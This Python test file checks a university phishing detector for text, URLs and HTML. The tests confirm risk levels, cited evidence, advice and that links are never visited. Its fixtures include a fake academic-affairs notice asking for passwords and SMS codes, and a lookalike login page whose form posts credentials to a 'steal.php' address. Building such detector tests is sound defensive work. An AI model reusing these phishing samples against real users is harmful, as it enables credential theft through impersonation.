"""钓鱼识别（定向命题七）的回归测试。

命题七要「输出风险等级、疑似钓鱼原因、可疑证据点和处置建议」。
所以这里逐条证明：等级会给、原因说得清、证据点引用原文、建议能照着做，
并且整个过程不访问链接、不调大模型。
"""

import pytest

from zhihui_qilu.phishing_service import (
    PhishingInputError,
    analyze_html,
    analyze_text,
    analyze_url,
)

# 一段典型的仿冒通知：冒充教务处、制造时间压力、索要验证码、给了仿冒域名。
FAKE_NOTICE = """【教务处】紧急通知：您的校园网账号将于 24 小时内停用，
请立即登录 http://sdnu-edu.cn/login 验证身份，否则无法选课。
请输入学号和密码，并填写收到的短信验证码。"""

FAKE_HTML = """<html><head><base href="http://sdnu-edu.top/"></head><body>
<form action="http://sdnu-edu.top/steal.php" method="post">
  <input type="text" name="user">
  <input type="password" name="pass">
</form>
<script>window.location.href = "http://sdnu-edu.top/ok.html";</script>
</body></html>"""


def _codes(report) -> list[str]:
    return [item.code for item in report.findings]


def test_fake_notice_is_high_risk_with_reasons() -> None:
    """仿冒通知必须判高风险，并且原因要覆盖「施压 / 索要凭证 / 冒充 / 仿冒域名」。"""
    report = analyze_text(FAKE_NOTICE)

    assert report.risk_level == "high"
    assert report.risk_label == "高风险"
    codes = set(_codes(report))
    assert {"urgency_pressure", "credential_request", "impersonation", "lookalike_domain"} <= codes


def test_every_finding_carries_evidence_from_the_input() -> None:
    """证据点不能是空话：每条命中都要能从原文里找到对应片段。"""
    report = analyze_text(FAKE_NOTICE)

    assert report.findings
    for finding in report.findings:
        assert finding.title
        assert finding.detail
        assert finding.evidence
        assert all(item.strip() for item in finding.evidence)


def test_high_risk_advice_is_actionable() -> None:
    """高风险的建议要能照着做：别点、改密码、找谁核实。"""
    report = analyze_text(FAKE_NOTICE)
    joined = "".join(report.advice)

    assert "不要点任何链接" in joined
    assert "改密码" in joined
    assert "核实" in joined


def test_credential_request_alone_is_enough_to_flag() -> None:
    """只要索要验证码，即使没有链接也该报警——这条单独出现就足够定性。"""
    report = analyze_text("请把收到的短信验证码回复给我，用于核对身份。")

    assert "credential_request" in _codes(report)
    assert report.score >= 40


def test_legit_notice_signed_by_a_department_is_not_flagged() -> None:
    """正常通知本来就会署名「教务处」。只出现部门名不该被判成冒充——
    这条规则是放大器，不是触发器，否则每份真通知都会被盖一个黄标。"""
    report = analyze_text(
        "各位同学：\n本学期选课将于 11 月 18 日 9:00 开放，入口为学校官网「教务系统」。\n"
        "如遇登录问题，请携带学生证到文渊楼 305 咨询，或拨打电话 86180371。\n教务处"
    )

    assert report.risk_level == "low"
    assert report.findings == []
    assert report.score == 0


def test_impersonation_only_fires_alongside_a_hard_signal() -> None:
    """有硬信号时，「署名冒充」才补进来解释为什么这条通知更像假的。"""
    report = analyze_text("教务处通知：请立即回复短信验证码，否则账号停用。")

    codes = _codes(report)
    assert "credential_request" in codes
    assert "impersonation" in codes


def test_school_link_is_reported_as_safe() -> None:
    """学校域名不该被误判，而且要出现在 safe_links 里给人看。"""
    report = analyze_text("详情见 https://www.sdnu.edu.cn/info/1007/8781.htm 。")

    assert report.risk_level == "low"
    assert report.safe_links == ["https://www.sdnu.edu.cn/info/1007/8781.htm"]
    assert "lookalike_domain" not in _codes(report)


def test_short_link_and_ip_link_are_flagged() -> None:
    """短链看不出目标、IP 无法用证书验身份，两种都要点名。"""
    short = analyze_text("点这里领取 https://bit.ly/3xYzAbC")
    assert "shortened_link" in _codes(short)

    ip = analyze_text("教务系统请访问 http://10.0.0.5/login")
    assert "ip_link" in _codes(ip)


def test_url_check_does_not_duplicate_the_same_reason() -> None:
    """一条链接只报一次仿冒域名，不因为多条规则各扫一遍就重复刷分。"""
    report = analyze_url("http://sdnu-edu.xyz/login")

    assert _codes(report).count("lookalike_domain") == 1
    assert report.risk_level == "high"
    assert "risky_tld" in _codes(report)
    assert "no_tls" in _codes(report)


def test_unknown_domain_needs_verification_not_condemnation() -> None:
    """校外域名不等于钓鱼，但涉及账号密码时要核实——所以给「需要核实」而不是「高风险」。"""
    report = analyze_url("https://example.com/form")

    assert report.risk_level == "medium"
    assert report.risk_label == "需要核实"
    assert "unknown_domain" in _codes(report)


def test_official_domain_url_short_circuits_to_safe() -> None:
    """学校域名直接给「学校域名」，不再罗列无意义的风险项。"""
    report = analyze_url("https://aihub.sdnu.edu.cn/info/1008/1431.htm")

    assert report.risk_level == "low"
    assert report.risk_label == "学校域名"
    assert report.findings == []
    assert report.safe_links


def test_html_form_posting_off_campus_with_password_is_high_risk() -> None:
    """表单把密码提交到校外地址，是仿冒登录页最典型的一招。"""
    report = analyze_html(FAKE_HTML)
    codes = _codes(report)

    assert "external_form_action" in codes
    assert "password_form" in codes
    assert "base_href_redirect" in codes
    assert "js_redirect" in codes
    assert report.risk_level == "high"

    external = next(item for item in report.findings if item.code == "external_form_action")
    assert external.weight == 44
    assert any("steal.php" in item for item in external.evidence)


def test_html_also_scans_visible_text() -> None:
    """只看标签会漏掉正文里的诱导话术，所以可见文字也要过文本规则。"""
    report = analyze_html("<p>教务处通知：请立即回复短信验证码，否则账号停用。</p>")

    codes = _codes(report)
    assert "credential_request" in codes
    assert "urgency_pressure" in codes


def test_empty_input_is_rejected_with_a_usable_message() -> None:
    """空输入要给出「该怎么粘」的提示，而不是抛一个裸异常。"""
    for analyze in (analyze_text, analyze_html, analyze_url):
        with pytest.raises(PhishingInputError):
            analyze("   ")


def test_oversized_input_is_rejected() -> None:
    """超长输入直接拒绝，避免现场粘贴整份文档把界面拖住。"""
    with pytest.raises(PhishingInputError):
        analyze_text("钓鱼" * 12000)


def test_report_declares_it_never_visits_the_link() -> None:
    """识别工具本身不能变成探测工具，结论里要写明没有访问。"""
    reports = (
        analyze_text(FAKE_NOTICE),
        analyze_html(FAKE_HTML),
        analyze_url("http://sdnu-edu.xyz/login"),
    )
    for report in reports:
        assert "没有访问" in report.note or "不访问" in report.note


def test_as_dict_is_json_ready() -> None:
    """接口层直接返回这个字典，字段名要稳定。"""
    payload = analyze_text(FAKE_NOTICE).as_dict()

    assert set(payload) == {
        "input_type",
        "risk_level",
        "risk_label",
        "score",
        "findings",
        "advice",
        "note",
        "scanned_links",
        "safe_links",
    }
    assert payload["input_type"] == "text"
    assert isinstance(payload["score"], int)
    assert set(payload["findings"][0]) == {"code", "title", "detail", "weight", "evidence"}
